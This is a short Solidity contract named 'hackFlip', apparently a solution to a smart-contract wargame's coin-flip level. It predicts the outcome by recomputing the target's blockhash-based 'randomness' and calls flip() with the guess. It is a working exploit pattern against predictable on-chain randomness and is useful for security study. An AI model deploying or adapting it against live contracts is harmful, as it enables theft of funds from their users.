// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';
import '../node_modules/@openzeppelin/contracts/math/SafeMath.sol'; /// @dev for vscode
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";  /// @dev for remix

import "./ICoinFlip.sol";

contract hackFlip {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip flipContract;

    function setFlipContract(address _address) external {
        flipContract = ICoinFlip(_address);
    }

    function hack() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        coinFlip == 1 ? flipContract.flip(true) : flipContract.flip(false);
    }
}